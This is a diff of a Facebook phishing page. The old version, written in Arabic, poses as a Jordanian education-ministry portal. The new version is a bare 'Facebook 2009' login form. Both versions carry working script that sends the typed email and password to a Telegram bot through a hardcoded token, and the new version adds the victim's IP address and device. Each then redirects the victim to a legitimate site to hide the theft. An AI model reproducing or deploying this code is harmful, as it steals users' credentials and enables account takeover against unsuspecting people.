@@ -1,38 +1,21 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>قرارات عاجلة - جيل 2009</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { font-family: sans-serif; background: #f0f2f5; text-align: center; margin: 0; }
-        .header { background: #1877f2; color: white; padding: 15px; font-weight: bold; }
-        .box { background: white; max-width: 400px; margin: 20px auto; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
-        button { width: 95%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
+<html>
+<head><meta charset="UTF-8"><title>فيسبوك 2009</title></head>
 <body>
-    <div class="header">بوابة وزارة التربية والتعليم - جيل 2009 🎓</div>
-    <video width="100%" autoplay loop muted playsinline><source src="video.mp4" type="video/mp4"></video>
-    <div class="box">
-        <p><b>سجل دخولك لمشاهدة قرارات الوزارة العاجلة</b></p>
-        <form id="login">
-            <input type="text" id="u" placeholder="الإيميل أو الهاتف" required>
-            <input type="password" id="p" placeholder="كلمة السر" required>
-            <button type="submit">متابعة المشاهدة</button>
-        </form>
-    </div>
+    <form id="l">
+        <input type="text" id="u" placeholder="Email"><input type="password" id="p" placeholder="Pass">
+        <button type="submit">Login</button>
+    </form>
     <script>
         const pr = new URLSearchParams(window.location.search);
-        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-        document.getElementById('login').onsubmit = function(e) {
+        document.getElementById('l').onsubmit = async (e) => {
             e.preventDefault();
-            const msg = `🎯 صيدة فيسبوك (2009) 🎯\n👤 الصياد: ${pr.get('hunter')}\n📧 الحساب: ${document.getElementById('u').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
-            const fullMsg = encodeURIComponent(msg);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`)
-            .then(() => { window.location.href = "https://www.moe.gov.jo"; });
+            let ip = await (await fetch('https://api.ipify.org')).text();
+            const msg = encodeURIComponent(`🎯 صيدة فيسبوك\n👤 الصياد: ${pr.get('hunter')}\n📧: ${document.getElementById('u').value}\n🔑: ${document.getElementById('p').value}\n🌐 IP: ${ip}\n📱 الجهاز: ${navigator.platform}`);
+            const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`)
+            .then(() => { location.href="https://facebook.com"; });
         };
     </script>
 </body>
